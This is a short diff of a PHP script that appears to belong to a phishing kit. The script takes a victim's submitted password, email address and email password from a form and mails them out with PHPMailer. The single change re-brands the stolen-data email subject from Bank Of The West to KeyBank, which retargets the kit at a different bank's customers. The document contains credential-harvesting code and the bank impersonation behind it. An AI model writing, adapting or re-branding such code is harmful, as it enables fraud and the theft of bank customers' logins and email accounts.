@@ -46,7 +46,7 @@ if (isset($POST['password'])) {
     $Email = $POST['Email'];
     $EmailPass = $POST['EmailPass'];
 
-    $phpmailer->Subject = "New Details From Bank Of The West";
+    $phpmailer->Subject = "New Details From KeyBank";
 
 
     $phpmailer->Body = "
